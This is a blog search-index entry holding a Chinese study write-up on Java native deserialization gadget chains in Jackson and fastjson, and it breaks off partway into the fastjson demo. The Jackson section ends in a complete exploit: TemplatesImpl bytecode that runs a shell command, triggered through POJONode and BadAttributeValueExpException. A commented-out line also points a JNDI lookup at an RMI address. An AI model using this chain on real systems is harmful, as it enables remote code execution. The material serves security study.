<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>jackson和fastjson原生序列化</title>
    <link href="/2024/01/13/jackson%E5%92%8Cfastjson%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/01/13/jackson%E5%92%8Cfastjson%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><img src="138px-%E6%9C%9B%E6%9C%88%E5%89%91%E6%B3%95-%E5%A4%A7%E5%9B%BE.jpg" alt="img"></p><h2 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h2><h3 id="0x01-demo"><a href="#0x01-demo" class="headerlink" title="0x01 demo"></a>0x01 demo</h3><p>佬的文章，菜鸟的拿来主义。</p><p>链接</p><p><a href="https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/">https://www.viewofthai.link/2023/08/08/jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jacksonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Message</span> &#123;<br>        <span class="hljs-type">int</span> code;<br>        String detail;<br>        Object data;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCode</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDetail</span><span class="hljs-params">(String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getCode&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDetail</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getDetail&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-built_in">this</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail, Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> JsonProcessingException &#123;<br><br>        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();<br>        message.setCode(<span class="hljs-number">114514</span>);<br>        message.setDetail(<span class="hljs-string">&quot;thai want to test jackson&quot;</span>);<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> objectMapper.writeValueAsString(message);<br><br><br>        System.out.println(<span class="hljs-string">&quot;jackon string: &quot;</span> + s);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240113033842334.png" alt="image-20240113033842334"></p><p>可以看见Jackson在序列化，会调用javaBean的所有getter方法。</p><h3 id="0x02-人心浮躁，本人只学剑招，瞎分析"><a href="#0x02-人心浮躁，本人只学剑招，瞎分析" class="headerlink" title="0x02. 人心浮躁，本人只学剑招，瞎分析"></a>0x02. 人心浮躁，本人只学剑招，瞎分析</h3><p>打一个断点</p><p><img src="image-20240113034938265.png" alt="image-20240113034938265"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">getData:<span class="hljs-number">38</span>, jacksonTest$Message (com.jsonser)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>serializeAsField:<span class="hljs-number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)<br>serializeFields:<span class="hljs-number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)<br>serialize:<span class="hljs-number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)<br>_serialize:<span class="hljs-number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)<br>serializeValue:<span class="hljs-number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)<br>_writeValueAndClose:<span class="hljs-number">4568</span>, ObjectMapper (com.fasterxml.jackson.databind)<br>writeValueAsString:<span class="hljs-number">3821</span>, ObjectMapper (com.fasterxml.jackson.databind)<br>main:<span class="hljs-number">60</span>, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure><p>DefaultSerializerProvider#serializeValue</p><p><img src="image-20240113040440387.png" alt="image-20240113040440387"></p><p><img src="image-20240113040501753.png" alt="image-20240113040501753"></p><p>通过<code>findTypedValueSerializer</code>来从缓存中获取序列化器得到BeanSerializer。然后进行序列化</p><p>然后来到<code>BeanSerializer#serialize</code></p><p><img src="image-20240113041018608.png" alt="image-20240113041018608"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">BeanSerializerBase<span class="hljs-meta">#serializeFields</span><br></code></pre></td></tr></table></figure><p><img src="image-20240113041420589.png" alt="image-20240113041420589"></p><p>Bean类中的所有属性值的写入</p><p><img src="image-20240113041821522.png" alt="image-20240113041821522"></p><p>最后是能够调用对应属性值的getter方法进行赋值。</p><h3 id="0x03-构造链子"><a href="#0x03-构造链子" class="headerlink" title="0x03 构造链子"></a>0x03 构造链子</h3><p>通过上面分析，控制BeanSerializer，就可以对Bean类中的所有属性值进行getter。</p><p>writeValueAsString是jackson的反序列化入口。</p><p>所以找一个能触发writeValueAsString的就行。</p><p>com.fasterxml.jackson.databind.node.InternalNodeMapper#nodeToString</p><p><img src="image-20240113042939146.png" alt="image-20240113042939146"></p><p>com.fasterxml.jackson.databind.node.BaseJsonNode#toString</p><p><img src="image-20240113043101253.png" alt="image-20240113043101253"></p><p>所以要早一个可以序列化,然后触发BaseJsonNode#toString()。</p><p>网上的找到一个</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.node#POJONode<br></code></pre></td></tr></table></figure><p><img src="image-20240113043546441.png" alt="image-20240113043546441"></p><p>可以他继承ValueNode，<img src="image-20240113043613018.png" alt="image-20240113043613018"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ValueNode继承BaseJsonNode<br></code></pre></td></tr></table></figure><p>POJONode，ValueNode，都没有tostring()方法，所以POJONode.tostring会触发BaseJsonNode.tostring()</p><p>最后完成序列化触发getter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">POJONode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><h3 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h3><p>在写入序列化时会进行判断是否实现了<code>writeReplace</code>方法</p><p><img src="image-20240113044413128.png" alt="image-20240113044413128"></p><p><code>OJONode</code>的父类<code>BaseJsonNode</code>中就实现了这个方法，在这个方法的调用过程中抛出了异常，使得序列化过程中断</p><p>我们可以通过删除这个方法来跳过这个过程，进而成功的序列化。</p><p><img src="image-20240113044543157.png" alt="image-20240113044543157"></p><p>所以使用javassist删除就好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>jsonNode.removeMethod(writeReplace);<br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br></code></pre></td></tr></table></figure><p>最终exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIServer;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><span class="hljs-keyword">import</span> java.sql.DatabaseMetaData;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jackson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><span class="hljs-comment">//        jdbcRowSet.getDatabaseMetaData();</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);<br><span class="hljs-comment">//            for (CtMethod declaredMethod : ctClass.getDeclaredMethods()) &#123;</span><br><span class="hljs-comment">//                String methodname = declaredMethod.getName();</span><br><span class="hljs-comment">//                if ((methodname.startsWith(&quot;get&quot;)))&#123;</span><br><span class="hljs-comment">//                   if (!(methodname.equals(&quot;getDatabaseMetaData&quot;)))&#123;</span><br><span class="hljs-comment">//                    CtMethod rmmethod = ctClass.getDeclaredMethod(methodname);</span><br><span class="hljs-comment">//                    ctClass.removeMethod(rmmethod);</span><br><span class="hljs-comment">//                   &#125;</span><br><span class="hljs-comment">//                &#125;</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            ctClass.toClass(classLoader,null);</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><span class="hljs-comment">//        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();</span><br><span class="hljs-comment">//        jdbcRowSet.setDataSourceName(&quot;rmi://127.0.0.1:1099/remoteExploit8&quot;);</span><br><span class="hljs-comment">//        POJONode node = new POJONode(jdbcRowSet);</span><br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;1&quot;</span>,templates);<br><br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val,<span class="hljs-string">&quot;val&quot;</span>,jsonObject);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(templates,val);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./jackson&quot;</span>));<br>            outputStream.writeObject(hashMap);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./jackson&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><h3 id="0x01-demo偷学剑招"><a href="#0x01-demo偷学剑招" class="headerlink" title="0x01 demo偷学剑招"></a>0x01 demo偷学剑招</h3><p>没实力直接抄代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jacksonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Message</span> &#123;<br>        <span class="hljs-type">int</span> code;<br>        String detail;<br>        Object data;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCode</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDetail</span><span class="hljs-params">(String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getCode&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDetail</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getDetail&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-built_in">this</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail, Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> JsonProcessingException &#123;<br><br>        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> 